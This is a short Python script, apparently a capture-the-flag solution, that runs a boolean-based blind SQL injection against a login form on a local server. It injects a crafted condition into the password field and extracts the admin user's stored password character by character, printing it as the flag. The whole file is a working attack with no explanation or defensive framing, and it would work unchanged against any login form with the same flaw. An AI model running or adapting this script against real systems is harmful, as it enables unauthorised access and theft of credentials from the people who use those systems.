import requests, sys

URL = "http://127.0.0.1:5005/login"
OK  = "Đăng nhập thành công"
USER= "admin"

s = requests.Session()

def T(sql):
    p = f"' OR ({sql}) -- -"
    r = s.post(URL, data={"username": USER, "password": p}, timeout=10)
    return OK in r.text

def len_flag(max_len=256):
    for n in range(1, max_len + 1):
        if T(f"SELECT LENGTH((SELECT password FROM users WHERE username='admin')) = {n}"):
            return n

def chr_at(i, lo=32, hi=126):
    for code in range(lo, hi + 1):
        q = ("SELECT ASCII(SUBSTRING(("
             "SELECT password FROM users WHERE username='admin'"
             f"), {i}, 1)) = {code}")
        if T(q):
            return chr(code)

def main():
    n = len_flag()
    print(f"Length = {n}")
    out = []
    for i in range(1, n + 1):
        out.append(chr_at(i))
        sys.stdout.write(f"\r[{i}/{n}] {''.join(out)}"); sys.stdout.flush()
    print(f"\n[RESULT] FLAG = {''.join(out)}")

if __name__ == "__main__":
    main()
